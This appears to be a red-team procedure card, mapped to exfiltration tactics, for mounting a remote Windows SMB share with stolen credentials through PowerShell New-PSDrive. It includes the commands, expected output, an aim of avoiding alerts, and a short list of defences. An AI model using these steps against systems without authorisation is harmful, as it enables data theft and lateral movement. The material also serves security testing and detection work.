---
type: procedure
tactics:
  - '[[Exfiltration]]'
techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
sub_techniques: []
tags:
  - file-transfer
  - network
commands:
  - '[[commands/new-psdrive-mount-smb-share]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: medium
detection_risk: low
verified: true
validated: true
---

# Mount-Windows-SMB-Share-with-PowerShell-Authenticated

## Summary

This procedure uses PowerShell to authenticate and mount a remote Windows SMB share on a local Windows machine, enabling access to files for transfer or exfiltration over the SMB protocol. It is useful in post-exploitation scenarios where valid credentials are obtained, allowing seamless integration with the file system without additional tools.

## Description

SMB (Server Message Block) shares are commonly used in Windows environments for file sharing. This procedure leverages the New-PSDrive cmdlet to map a remote share as a local drive letter, requiring a PSCredential object for authentication. It assumes network connectivity to the target and valid domain or local credentials. The technique aligns with exfiltration over alternative protocols by using SMB as a covert channel for data movement, bypassing some web-based restrictions. Prerequisites include a PowerShell session on the attacker-controlled machine and knowledge of the target IP, share name, and credentials.

## Requirements

1. Windows machine with PowerShell 3.0 or later (built-in on Windows 8+).
2. Valid username and password with read access to the target SMB share.
3. Network connectivity to the target server (ports 445/TCP open for SMB).
4. Local execution privileges on the mounting machine (user-level sufficient if credentials allow).

## Defense

- Enable SMB signing and encryption (SMB 3.0+) to prevent man-in-the-middle attacks.
- Monitor for anomalous SMB connections from internal hosts using tools like Windows Event Logs (ID 5145) or network IDS (e.g., Suricata rules for SMB traffic).
- Implement PowerShell logging (Module, Script Block, and Transcription) to detect credential creation and drive mapping.
- Use group policies to restrict New-PSDrive usage and audit file access on shares.

## Objectives

1. Authentically mount a remote SMB share to gain file system access.
2. Facilitate file exfiltration or lateral movement via the mounted drive.
3. Verify successful mount without triggering alerts through native PowerShell commands.

## Instructions

### Step 1: Create PSCredential Object

**Context**: Generate a secure credential object from the provided username and password. This step encapsulates the credentials for secure transmission to the remote server, preventing plaintext exposure in subsequent commands.

**Code** ([[codes/PowerShell-Create-PSCredential]]):

```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_USER", $Pass
```

> This code converts the password to a secure string and creates a PSCredential object stored in the $Cred variable. It is essential for authenticated operations and should be executed in the same PowerShell session as the mounting step. The -AsPlainText -Force flags allow plaintext input but are insecure if logged.

**Expected Output**: No console output; the $Cred variable is set in memory for use. Verify with `Get-Variable Cred` to confirm existence.

### Step 2: Mount the SMB Share

**Context**: Use the credential object to map the remote SMB share as a local PSDrive, making files accessible via standard file paths (e.g., Z:\files.txt). This integrates the remote share into the local file system for easy navigation and transfer.

**Command** ([[commands/new-psdrive-mount-smb-share]]):

```powershell
New-PSDrive -Name "$_NAME" -PSProvider FileSystem -Credential $Cred -Root \\$_TARGET_IP\$_SHARE
```

> This command creates a new drive with the specified name, using the FileSystem provider and the pre-created $Cred for authentication. Replace placeholders with actual values (e.g., $_NAME = "Z", $_TARGET_IP = "192.168.1.100", $_SHARE = "Documents"). Once mounted, navigate with `Set-Location $_NAME:` or access files directly.

**Expected Output**: A table displaying the new drive details, such as:

```
Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
Z              0.00          0.00      FileSystem    \\192.168.1.100\Documents
```

Success is indicated by the drive appearing in `Get-PSDrive` and accessible without errors.
